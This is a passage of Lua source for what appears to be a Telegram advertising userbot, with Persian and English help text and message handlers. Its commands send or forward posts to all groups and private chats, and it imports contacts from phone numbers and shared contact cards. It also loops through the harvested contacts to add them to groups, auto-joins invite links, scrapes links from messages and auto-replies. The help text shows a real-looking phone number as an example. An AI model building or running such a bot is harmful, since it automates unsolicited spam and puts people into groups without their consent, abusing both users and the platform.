            local txt = "\240\159\147\141\216\177\216\167\217\135\217\134\217\133\216\167\219\140 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\177\216\168\216\167\216\170 new\240\159\147\141\n\n\216\167\217\134\217\132\216\167\219\140\217\134\n\216\167\216\185\217\132\216\167\217\133 \217\136\216\182\216\185\219\140\216\170 \216\177\216\168\216\167\216\170 new \226\156\148\239\184\143\n\226\157\164\239\184\143 \216\173\216\170\219\140 \216\167\218\175\216\177 \216\177\216\168\216\167\216\170 new \216\180\217\133\216\167 \216\175\218\134\216\167\216\177 \217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\180\216\175\217\135 \216\168\216\167\216\180\216\175 \216\168\216\167\219\140\216\179\216\170\219\140 \216\168\217\135 \216\167\219\140\217\134 \217\190\219\140\216\167\217\133 \217\190\216\167\216\179\216\174 \216\175\217\135\216\175\226\157\164\239\184\143\n\n\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\175\219\140\216\177 \216\180\217\134\216\167\216\179\217\135\n\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\175\219\140\216\177 \216\172\216\175\219\140\216\175 \216\168\216\167 \216\180\217\134\216\167\216\179\217\135 \216\185\216\175\216\175\219\140 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \240\159\155\130\n\n\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\175\219\140\216\177\218\169\217\132 \216\180\217\134\216\167\216\179\217\135\n\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\175\219\140\216\177\218\169\217\132 \216\172\216\175\219\140\216\175 \216\168\216\167 \216\180\217\134\216\167\216\179\217\135 \216\185\216\175\216\175\219\140 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \240\159\155\130\n\n(\226\154\160\239\184\143 \216\170\217\129\216\167\217\136\216\170 \217\133\216\175\219\140\216\177 \217\136 \217\133\216\175\219\140\216\177\226\128\140\218\169\217\132 \216\175\216\179\216\170\216\177\216\179\219\140 \216\168\217\135 \216\167\216\185\216\183\216\167 \217\136 \219\140\216\167 \218\175\216\177\217\129\216\170\217\134 \217\133\217\130\216\167\217\133 \217\133\216\175\219\140\216\177\219\140\216\170 \216\167\216\179\216\170\226\154\160\239\184\143)\n\n\216\173\216\176\217\129 \217\133\216\175\219\140\216\177 \216\180\217\134\216\167\216\179\217\135\n\216\173\216\176\217\129 \217\133\216\175\219\140\216\177 \219\140\216\167 \217\133\216\175\219\140\216\177\218\169\217\132 \216\168\216\167 \216\180\217\134\216\167\216\179\217\135 \216\185\216\175\216\175\219\140 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \226\156\150\239\184\143\n\n\216\170\216\177\218\169 \218\175\216\177\217\136\217\135\n\216\174\216\167\216\177\216\172 \216\180\216\175\217\134 \216\167\216\178 \218\175\216\177\217\136\217\135 \217\136 \216\173\216\176\217\129 \216\162\217\134 \216\167\216\178 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \218\175\216\177\217\136\217\135 \217\135\216\167 \240\159\143\131\n\n\216\167\217\129\216\178\217\136\216\175\217\134 \217\135\217\133\217\135 \217\133\216\174\216\167\216\183\216\168\219\140\217\134\n\216\167\217\129\216\178\217\136\216\175\217\134 \216\173\216\175\216\167\218\169\216\171\216\177 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 \217\136 \216\167\217\129\216\177\216\167\216\175 \216\175\216\177 \218\175\217\129\216\170 \217\136 \218\175\217\136\217\135\216\167\219\140 \216\180\216\174\216\181\219\140 \216\168\217\135 \218\175\216\177\217\136\217\135 \226\158\149\n\n\216\168\218\175\217\136 \217\133\216\170\217\134\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\133\216\170\217\134 \240\159\151\163\n\n\216\167\216\177\216\179\216\167\217\132 \218\169\217\134 \"\216\180\217\134\216\167\216\179\217\135\" \217\133\216\170\217\134\n\216\167\216\177\216\179\216\167\217\132 \217\133\216\170\217\134 \216\168\217\135 \216\180\217\134\216\167\216\179\217\135 \218\175\216\177\217\136\217\135 \219\140\216\167 \218\169\216\167\216\177\216\168\216\177 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \240\159\147\164\n\n\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \"\217\134\216\167\217\133\" \217\129\216\167\217\133\219\140\217\132\n\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \216\177\216\168\216\167\216\170 \226\156\143\239\184\143\n\n\216\170\216\167\216\178\217\135 \216\179\216\167\216\178\219\140 \216\177\216\168\216\167\216\170\n\216\170\216\167\216\178\217\135\226\128\140\216\179\216\167\216\178\219\140 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \217\129\216\177\216\175\219\140 \216\177\216\168\216\167\216\170\240\159\142\136\n(\217\133\217\136\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\175\216\177 \217\133\217\136\216\167\216\177\216\175\219\140 \217\135\217\133\218\134\217\136\217\134 \217\190\216\179 \216\167\216\178 \216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133\240\159\147\141\216\172\217\135\216\170 \216\168\216\177\217\136\216\178\218\169\216\177\216\175\217\134 \217\134\216\167\217\133 \217\133\216\174\216\167\216\183\216\168 \216\167\216\180\216\170\216\177\216\167\218\169\219\140 \216\177\216\168\216\167\216\170 \216\170\219\140 \216\175\219\140 \216\167\216\175\216\178\240\159\147\141)\n\n\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140 \216\167\216\179\217\133\n\216\172\216\167\219\140\218\175\216\178\219\140\217\134\219\140 \216\167\216\179\217\133 \216\168\216\167 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140 \217\129\216\185\217\132\219\140(\217\133\216\173\216\175\217\136\216\175 \216\175\216\177 \216\168\216\167\216\178\217\135 \216\178\217\133\216\167\217\134\219\140 \218\169\217\136\216\170\216\167\217\135) \240\159\148\132\n\n\216\173\216\176\217\129 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140\n\216\173\216\176\217\129 \218\169\216\177\216\175\217\134 \217\134\216\167\217\133 \218\169\216\167\216\177\216\168\216\177\219\140 \226\157\142\n\n\216\170\217\136\217\130\217\129 \216\185\216\182\217\136\219\140\216\170|\216\170\216\167\219\140\219\140\216\175 \217\132\219\140\217\134\218\169|\216\180\217\134\216\167\216\179\216\167\219\140\219\140 \217\132\219\140\217\134\218\169|\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168\n\216\186\219\140\216\177\226\128\140\217\129\216\185\216\167\217\132 \218\169\216\177\216\175\217\134 \217\129\216\177\216\167\219\140\217\134\216\175 \216\174\217\136\216\167\216\179\216\170\217\135 \216\180\216\175\217\135 \226\151\188\239\184\143\n\n\216\180\216\177\217\136\216\185 \216\185\216\182\217\136\219\140\216\170|\216\170\216\167\219\140\219\140\216\175 \217\132\219\140\217\134\218\169|\216\180\217\134\216\167\216\179\216\167\219\140\219\140 \217\132\219\140\217\134\218\169|\216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168\n\217\129\216\185\216\167\217\132\226\128\140\216\179\216\167\216\178\219\140 \217\129\216\177\216\167\219\140\217\134\216\175 \216\174\217\136\216\167\216\179\216\170\217\135 \216\180\216\175\217\135 \226\151\187\239\184\143\n\n\216\173\216\175\216\167\218\169\216\171\216\177 \218\175\216\177\217\136\217\135 \216\185\216\175\216\175\n\216\170\217\134\216\184\219\140\217\133 \216\173\216\175\216\167\218\169\216\171\216\177 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135\226\128\140\217\135\216\167\219\140\219\140 \218\169\217\135 \216\177\216\168\216\167\216\170 new \216\185\216\182\217\136 \217\133\219\140\226\128\140\216\180\217\136\216\175\216\140\216\168\216\167 \216\185\216\175\216\175 \216\175\217\132\216\174\217\136\216\167\217\135 \226\172\134\239\184\143\n\n\216\173\216\175\216\167\217\130\217\132 \216\167\216\185\216\182\216\167 \216\185\216\175\216\175\n\216\170\217\134\216\184\219\140\217\133 \216\180\216\177\216\183 \216\173\216\175\217\130\217\132\219\140 \216\167\216\185\216\182\216\167\219\140 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\185\216\182\217\136\219\140\216\170,\216\168\216\167 \216\185\216\175\216\175 \216\175\217\132\216\174\217\136\216\167\217\135 \226\172\135\239\184\143\n\n\216\173\216\176\217\129 \216\173\216\175\216\167\218\169\216\171\216\177 \218\175\216\177\217\136\217\135\n\217\134\216\167\216\175\219\140\216\175\217\135 \218\175\216\177\217\129\216\170\217\134 \216\173\216\175\217\133\216\172\216\167\216\178 \216\170\216\185\216\175\216\167\216\175 \218\175\216\177\217\136\217\135 \226\158\176\n\n\216\173\216\176\217\129 \216\173\216\175\216\167\217\130\217\132 \216\167\216\185\216\182\216\167\n\217\134\216\167\216\175\219\140\216\175\217\135 \218\175\216\177\217\129\216\170\217\134 \216\180\216\177\216\183 \216\173\216\175\216\167\217\130\217\132 \216\167\216\185\216\182\216\167\219\140 \218\175\216\177\217\136\217\135 \226\154\156\239\184\143\n\n\216\167\216\177\216\179\216\167\217\132 \216\178\217\133\216\167\217\134\219\140 \216\177\217\136\216\180\217\134|\216\174\216\167\217\133\217\136\216\180\n\216\178\217\133\216\167\217\134 \216\168\217\134\216\175\219\140 \216\175\216\177 \217\129\216\177\217\136\216\167\216\177\216\175 \217\136 \216\167\216\177\216\179\216\167\217\132 \217\136 \216\167\217\129\216\178\217\136\216\175\217\134 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\136 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\175\216\177 \216\175\216\179\216\170\217\136\216\177 \216\167\216\177\216\179\216\167\217\132 \226\143\178\n\n\216\170\217\134\216\184\219\140\217\133 \216\170\216\185\216\175\216\167\216\175 \216\185\216\175\216\175\n\216\170\217\134\216\184\219\140\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \217\133\219\140\216\167\217\134 \217\136\217\130\217\129\217\135 \216\175\216\177 \216\167\216\177\216\179\216\167\217\132 \216\178\217\133\216\167\217\134\219\140\n\n\216\170\217\134\216\184\219\140\217\133 \217\136\217\130\217\129\217\135 \216\185\216\175\216\175\n\216\170\217\134\216\184\219\140\217\133 \217\136\217\130\217\129\217\135 \216\168\217\135 \216\171\216\167\217\134\219\140\217\135 \216\175\216\177 \216\185\217\133\217\132\219\140\216\167\216\170 \216\178\217\133\216\167\217\134\219\140\n\n\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\216\167 \216\180\217\133\216\167\216\177\217\135 \216\177\217\136\216\180\217\134|\216\174\216\167\217\133\217\136\216\180\n\216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\167\216\180\216\170\216\177\216\167\218\169 \216\180\217\133\216\167\216\177\217\135 \216\177\216\168\216\167\216\170 new \216\175\216\177 \216\172\217\136\216\167\216\168 \216\180\217\133\216\167\216\177\217\135 \216\168\217\135 \216\167\216\180\216\170\216\177\216\167\218\169 \218\175\216\176\216\167\216\180\216\170\217\135 \216\180\216\175\217\135 \240\159\148\150\n\n\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\216\167 \217\190\219\140\216\167\217\133 \216\177\217\136\216\180\217\134|\216\174\216\167\217\133\217\136\216\180\n\216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\175\216\177 \216\172\217\136\216\167\216\168 \216\180\217\133\216\167\216\177\217\135 \216\168\217\135 \216\167\216\180\216\170\216\177\216\167\218\169 \218\175\216\176\216\167\216\180\216\170\217\135 \216\180\216\175\217\135 \226\132\185\239\184\143\n\n\216\170\217\134\216\184\219\140\217\133 \217\190\219\140\216\167\217\133 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168 \217\133\216\170\217\134\n\216\170\217\134\216\184\219\140\217\133 \217\133\216\170\217\134 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \216\168\217\135 \216\185\217\134\217\136\216\167\217\134 \216\172\217\136\216\167\216\168 \216\180\217\133\216\167\216\177\217\135 \216\168\217\135 \216\167\216\180\216\170\216\177\216\167\218\169 \218\175\216\176\216\167\216\180\216\170\217\135 \216\180\216\175\217\135 \240\159\147\132\n\n\217\133\216\179\216\175\217\136\216\175\219\140\216\170 \216\180\217\134\216\167\216\179\217\135\n\217\133\216\179\216\175\217\136\216\175\226\128\140\218\169\216\177\216\175\217\134(\216\168\217\132\216\167\218\169) \218\169\216\167\216\177\216\168\216\177 \216\168\216\167 \216\180\217\134\216\167\216\179\217\135 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \216\167\216\178 \218\175\217\129\216\170 \217\136 \218\175\217\136\219\140 \216\174\216\181\217\136\216\181\219\140 \240\159\154\171\n\n\216\177\217\129\216\185 \217\133\216\179\216\175\217\136\216\175\219\140\216\170 \216\180\217\134\216\167\216\179\217\135\n\216\177\217\129\216\185 \217\133\216\179\216\175\217\136\216\175\219\140\216\170 \218\169\216\167\216\177\216\168\216\177 \216\168\216\167 \216\180\217\134\216\167\216\179\217\135 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \240\159\146\162\n\n\217\136\216\182\216\185\219\140\216\170 \217\133\216\180\216\167\217\135\216\175\217\135 \216\177\217\136\216\180\217\134|\216\174\216\167\217\133\217\136\216\180 \240\159\145\129\n\216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \217\133\216\180\216\167\217\135\216\175\217\135 \217\190\219\140\216\167\217\133\226\128\140\217\135\216\167 \216\170\217\136\216\179\216\183 \216\177\216\168\216\167\216\170 \216\170\219\140 \216\175\219\140 \216\167\216\175\216\178 (\217\129\216\185\216\167\217\132 \217\136 \216\186\219\140\216\177\226\128\140\217\129\216\185\216\167\217\132\226\128\140\218\169\216\177\216\175\217\134 \216\170\219\140\218\169 \216\175\217\136\217\133)\n\n\216\167\217\133\216\167\216\177\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\162\217\133\216\167\216\177 \217\136 \217\136\216\182\216\185\219\140\216\170 \216\177\216\168\216\167\216\170 new \240\159\147\138\n\n\217\136\216\182\216\185\219\140\216\170\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\136\216\182\216\185\219\140\216\170 \216\167\216\172\216\177\216\167\219\140\219\140 \216\177\216\168\216\167\216\170 new\226\154\153\239\184\143\n\n\216\170\216\167\216\178\217\135 \216\179\216\167\216\178\219\140\n\216\170\216\167\216\178\217\135\226\128\140\216\179\216\167\216\178\219\140 \216\162\217\133\216\167\216\177 \216\177\216\168\216\167\216\170 \216\170\219\140 \216\175\219\140 \216\167\216\175\216\178\240\159\154\128\n\240\159\142\131\217\133\217\136\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\173\216\175\216\167\218\169\216\171\216\177 \219\140\218\169 \216\168\216\167\216\177 \216\175\216\177 \216\177\217\136\216\178\240\159\142\131\n\n\216\167\216\177\216\179\216\167\217\132 \216\168\217\135 \217\135\217\133\217\135|\216\174\216\181\217\136\216\181\219\140|\218\175\216\177\217\136\217\135|\216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\172\217\136\216\167\216\168 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \216\168\217\135 \217\133\217\136\216\177\216\175 \216\174\217\136\216\167\216\179\216\170\217\135 \216\180\216\175\217\135 \240\159\147\169\n(\240\159\152\132\216\170\217\136\216\181\219\140\217\135 \217\133\216\167 \216\185\216\175\217\133 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \217\135\217\133\217\135 \217\136 \216\174\216\181\217\136\216\181\219\140\240\159\152\132)\n\n\216\167\216\177\216\179\216\167\217\132 \216\168\217\135 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135 \217\133\216\170\217\134\n\216\167\216\177\216\179\216\167\217\132 \217\133\216\170\217\134 \216\175\216\167\216\175\217\135 \216\180\216\175\217\135 \216\168\217\135 \217\135\217\133\217\135 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135 \217\135\216\167 \226\156\137\239\184\143\n(\240\159\152\156\216\170\217\136\216\181\219\140\217\135 \217\133\216\167 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\136 \216\167\216\175\216\186\216\167\217\133 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\168\218\175\217\136 \217\136 \216\167\216\177\216\179\216\167\217\132 \216\168\217\135 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135\240\159\152\156)\n\n\216\170\217\134\216\184\219\140\217\133 \216\172\217\136\216\167\216\168 \"\217\133\216\170\217\134\" \216\172\217\136\216\167\216\168\n\216\170\217\134\216\184\219\140\217\133 \216\172\217\136\216\167\216\168\219\140 \216\168\217\135 \216\185\217\134\217\136\216\167\217\134 \217\190\216\167\216\179\216\174 \216\174\217\136\216\175\218\169\216\167\216\177 \216\168\217\135 \217\190\219\140\216\167\217\133 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \217\133\216\183\216\167\216\168\217\130 \216\168\216\167 \217\133\216\170\217\134 \216\168\216\167\216\180\216\175 \240\159\147\157\n\n\216\173\216\176\217\129 \216\172\217\136\216\167\216\168 \217\133\216\170\217\134\n\216\173\216\176\217\129 \216\172\217\136\216\167\216\168 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \217\133\216\170\217\134 \226\156\150\239\184\143\n\n\217\190\216\167\216\179\216\174\218\175\217\136\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \216\177\217\136\216\180\217\134|\216\174\216\167\217\133\217\136\216\180\n\216\170\216\186\219\140\219\140\216\177 \217\136\216\182\216\185\219\140\216\170 \217\190\216\167\216\179\216\174\218\175\217\136\219\140\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \216\177\216\168\216\167\216\170 TeleGram Advertising \216\168\217\135 \217\133\216\170\217\134 \217\135\216\167\219\140 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175\217\135 \240\159\147\175\n\n\216\173\216\176\217\129 \217\132\219\140\217\134\218\169 \216\185\216\182\217\136\219\140\216\170|\216\170\216\167\219\140\219\140\216\175|\216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135\n\216\173\216\176\217\129 \217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169\226\128\140\217\135\216\167\219\140 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \226\157\140\n\n\216\173\216\176\217\129 \218\169\217\132\219\140 \217\132\219\140\217\134\218\169 \216\185\216\182\217\136\219\140\216\170|\216\170\216\167\219\140\219\140\216\175|\216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135\n\216\173\216\176\217\129 \218\169\217\132\219\140 \217\132\219\140\216\179\216\170 \217\132\219\140\217\134\218\169\226\128\140\217\135\216\167\219\140 \217\133\217\136\216\177\216\175 \217\134\216\184\216\177 \240\159\146\162\n\240\159\148\186\217\190\216\176\219\140\216\177\217\129\216\170\217\134 \217\133\216\172\216\175\216\175 \217\132\219\140\217\134\218\169 \216\175\216\177 \216\181\217\136\216\177\216\170 \216\173\216\176\217\129 \218\169\217\132\219\140\240\159\148\187\n\n\216\167\216\179\216\170\216\167\216\177\216\170 \219\140\217\136\216\178\216\177\217\134\219\140\217\133\n\216\167\216\179\216\170\216\167\216\177\216\170 \216\178\216\175\217\134 \216\177\216\168\216\167\216\170 \216\168\216\167 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135\n\n\216\167\217\129\216\178\217\136\216\175\217\134 \216\168\217\135 \217\135\217\133\217\135 \219\140\217\136\216\178\216\177\217\134\219\140\217\133\n\216\167\217\129\216\178\217\136\216\175\217\134 \218\169\216\167\216\168\216\177 \216\168\216\167 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\168\217\135 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\136 \216\179\217\136\217\190\216\177\218\175\216\177\217\136\217\135 \217\135\216\167 \226\158\149\226\158\149\n\n\218\175\216\177\217\136\217\135 \216\185\216\182\217\136\219\140\216\170 \216\168\216\167\216\178 \216\177\217\136\216\180\217\134|\216\174\216\167\217\133\217\136\216\180\n\216\185\216\182\217\136\219\140\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\216\167 \216\180\216\177\216\167\219\140\216\183 \216\170\217\136\216\167\217\134\216\167\219\140\219\140 \216\177\216\168\216\167\216\170 TeleGram Advertising \216\168\217\135 \216\167\217\129\216\178\217\136\216\175\217\134 \216\185\216\182\217\136\n\n\216\170\216\177\218\169 \218\169\216\177\216\175\217\134 \216\180\217\134\216\167\216\179\217\135\n\216\185\217\133\217\132\219\140\216\167\216\170 \216\170\216\177\218\169 \218\169\216\177\216\175\217\134 \216\168\216\167 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\180\217\134\216\167\216\179\217\135 \218\175\216\177\217\136\217\135 \240\159\143\131\n\n\216\177\216\167\217\135\217\134\217\133\216\167\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\135\217\133\219\140\217\134 \217\190\219\140\216\167\217\133 \240\159\134\152\n\n \216\176\216\174\219\140\216\177\217\135 \216\180\217\133\216\167\216\177\217\135 +989216973112\t\n \216\176\216\174\219\140\216\177\217\135 \219\140\218\169 \216\180\217\133\216\167\216\177\217\135 \216\174\216\167\216\181 \n\n \216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132 -000000\t\n \216\170\217\134\216\184\219\140\217\133 \219\140\218\169 \218\169\216\167\217\134\216\167\217\132 \216\168\216\177\216\167\219\140 \217\129\217\136\216\177\217\136\216\167\216\177\216\175 \217\190\216\179\216\170 \217\135\216\167 \n\n \216\162\217\129\217\132\216\167\219\140\217\134 0 \n \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170 \217\136 \216\167\216\172\216\177\216\167\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \216\168\216\185\216\175 \216\167\216\178 \216\178\217\133\216\167\217\134 \217\136\216\177\217\136\216\175\219\140\n\n \216\185\216\182\217\136\219\140\216\170 https://... \n \216\185\216\182\217\136\219\140\216\170 \216\175\216\177 \219\140\218\169 \217\132\219\140\217\134\218\169 \216\174\216\167\216\181       \n\nPublisher ..\ntgChannel ..\n"
            return send(msg.chat_id, msg.id, txt)
          elseif text:match("^([Hh]elp)$") then
            local txt1 = "Help for TeleGram Advertisin Robot (new)\n\nInfo\n    statistics and information\n \nPromote (user-Id)\n    add new moderator\n      \nDemote (userId)\n remove moderator\n      \nSend (text)\n    send message too all super group;s\n    \nFwd {all or sgp or gp or pv} (by reply)\n    forward your post to :\n    super group or group or private\n    \nAddedMsg (on or off)\n    import contacts by send message\n \nSetAddedMsg (text)\n    set message when add contact\n    \nAddToAll @(usename)\n    add user or robot to all group's \n\nAddMembers\n    add contact's to group\n\nDel (lnk, cotact, sudo)\n     delete selected item\n\njoin (on or off)\n    set join to link's or don't join\n\nchklnk (on or off)\n    check link's in terms of valid\nand\n    Separating healthy and corrupted links\n\nfindlnk (on or off)\n    search in group's and find link\n\nGpDelay (secound)\n    The number of groups was set between send times\n\n\217\143SetDelay (secound)\n    Interval time between posts was set\n\nBlock (User-Id)\n    Block user \n\nUnBlock (User-Id)\n    UnBlock user\n\nSetName (\"name\" lastname)\n    Set new name\n\nSetUserName (Ussername)\n    Set new username\n\nDelUserName\n    delete user name\n    \nAdd (phone number)\n   add contact by phone number\n\nAddContact (on or off)\n    import contact by sharing number\n\nfwdtime (on or off)\n    Schedule forward on posting\n\nmarkread (on or off)\n    Mark read status\n\nGpMember 1~50000\n    set the minimum group members to join\n\nDelGpMember\n    Disable\n\nMaxGroup\n    The maximum number of robots has been set\n\nDelMaxGroup\n    Disable\n\nRefresh\n    Refresh information\n\nJoinOpenAdd (on or off)\n    just join to open add members groups\n\nJoin (Private Link)\n    Join to Link (channel, gp, ..)\n\nPing\n    test to server connection\n\nBot @(username)\n    Start api bot\n\nSet (Channel-Id)\n    set channel for auto forward \n\nLeft all or (group-Id)\n    leave of all group \n\nReset\n   zeroing the robot statistics\n\nYou can send command with or with out: \n!  /  #  $ \nbefore command\n     \nPublisher ..\ntgChannel ..\n"
            return send(msg.chat_id, msg.id, txt1)
          elseif text:match("^([Aa]dd) (.*)$") then
            local matches = text:match("^[Aa]dd (.*)$")
            assert(tdbot_function({
              _ = "importContacts",
              contacts = {
                [0] = {
                  _ = "contact",
                  phone_number = tostring(matches),
                  first_name = tostring("Contact "),
                  last_name = tostring("Add"),
                  user_id = 0
                }
              }
            }, cb or cb or dl_cb, nil))
            send(msg.chat_id, msg.id, "Added " .. matches .. " \240\159\147\153")
          elseif text:match("^(\216\176\216\174\219\140\216\177\217\135 \216\180\217\133\216\167\216\177\217\135) (.*)$") then
            local matches = text:match("^\216\176\216\174\219\140\216\177\217\135 \216\180\217\133\216\167\216\177\217\135 (.*)$")
            assert(tdbot_function({
              _ = "importContacts",
              contacts = {
                [0] = {
                  _ = "contact",
                  phone_number = tostring(matches),
                  first_name = tostring("Contact "),
                  last_name = tostring("Add"),
                  user_id = 0
                }
              }
            }, cb or cb or dl_cb, nil))
            send(msg.chat_id, msg.id, "Added " .. matches .. " \240\159\147\153")
          elseif tostring(msg.chat_id):match("^-") then
            if text:match("^(\216\170\216\177\218\169 \218\169\216\177\216\175\217\134)$") or text:match("^([Ll]eft)$") then
              rem(msg.chat_id)
              return assert(tdbot_function({
                _ = "changeChatMemberStatus",
                chat_id = msg.chat_id,
                user_id = tonumber(bot_id),
                status = {
                  _ = "chatMemberStatusLeft"
                }
              }, cb or dl_cb, nil))
            elseif text:match("^([Aa]dd[Mm]embers)$") or text:match("^(\216\167\217\129\216\178\217\136\216\175\217\134 \217\135\217\133\217\135 \217\133\216\174\216\167\216\183\216\168\219\140\217\134)$") then
              send(msg.chat_id, msg.id, "\216\175\216\177 \216\173\216\167\217\132 \216\167\217\129\216\178\217\136\216\175\217\134 \217\133\216\174\216\167\216\183\216\168\219\140\217\134 \216\168\217\135 \218\175\216\177\217\136\217\135 ...")
              assert(tdbot_function({
                _ = "searchContacts",
                query = nil,
                limit = 999999999
              }, function(i, tg)
                local users, count = redis:smembers("tg:" .. Ads_id .. ":users"), tg.total_count
                for n = 0, tonumber(count) - 1 do
                  assert(tdbot_function({
                    _ = "addChatMember",
                    chat_id = tonumber(i.chat_id),
                    user_id = tg.users[n].id,
                    forward_limit = 37
                  }, dl_cb, extra))
                end
                for n = 1, #users do
                  assert(tdbot_function({
                    _ = "addChatMember",
                    chat_id = tonumber(i.chat_id),
                    user_id = tonumber(users[n]),
                    forward_limit = 37
                  }, dl_cb, extra))
                end
              end, {
                chat_id = msg.chat_id
              }))
              return
            end
          end
        end
        if redis:sismember("tg:" .. Ads_id .. ":answerslist", text) and redis:get("tg:" .. Ads_id .. ":autoanswer") and msg.sender_user_id ~= bot_id then
          local answer = redis:hget("tg:" .. Ads_id .. ":answers", text)
          send(msg.chat_id, 0, answer)
        end
      elseif msg.content._ == "messageContact" and redis:get("tg:" .. Ads_id .. ":savecontacts") then
        local id = msg.content.contact.user_id
        if not redis:sismember("tg:" .. Ads_id .. ":addedcontacts", id) then
          redis:sadd("tg:" .. Ads_id .. ":addedcontacts", id)
          local first = msg.content.contact.first_name or "-"
          local last = msg.content.contact.last_name or "-"
          local phone = msg.content.contact.phone_number
          local id = msg.content.contact.user_id
          assert(tdbot_function({
            _ = "importContacts",
            contacts_ = {
              [0] = {
                phone_number = tostring(phone),
                first_name = tostring(first),
                last_name = tostring(last),
                user_id = id
              }
            }
          }, cb or dl_cb, nil))
          if redis:get("tg:" .. Ads_id .. ":addcontact") and msg.sender_user_id ~= bot_id then
            local fname = redis:get("tg:" .. Ads_id .. ":fname")
            local lname = redis:get("tg:" .. Ads_id .. ":lname") or ""
            local num = redis:get("tg:" .. Ads_id .. ":num")
            assert(tdbot_function({
              _ = "sendMessage",
              chat_id = msg.chat_id,
              reply_to_message_id = msg.id,
              disable_notification = 1,
              from_background = 1,
              reply_markup = nil,
              input_message_content = {
                _ = "inputMessageContact",
                contact = {
                  _ = "contact",
                  phone_number = num,
                  first_name = fname,
                  last_name = lname,
                  user_id = bot_id
                }
              }
            }, dl_cb, nil))
          end
        end
        if redis:get("tg:" .. Ads_id .. ":addmsg") then
          local answer = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "\216\167\216\175\216\175\219\140 \218\175\217\132\217\133 \216\174\216\181\217\136\216\181\219\140 \217\190\219\140\216\167\217\133 \216\168\216\175\217\135"
          send(msg.chat_id, msg.id, answer)
        end
      elseif msg.content._ == "messageChatDeleteMember" and msg.content.id == bot_id then
        return rem(msg.chat_id)
      elseif msg.content.caption and redis:get("tg:" .. Ads_id .. ":link") then
        find_link(msg.content.caption)
      end
      if redis:get("tg:" .. Ads_id .. ":markread") then
        assert(tdbot_function({
          _ = "viewMessages",
          chat_id = msg.chat_id,
          message_ids = {
            [0] = msg.id
          }
        }, cb or dl_cb, nil))
      end
    end
  else
  end
end
return redis
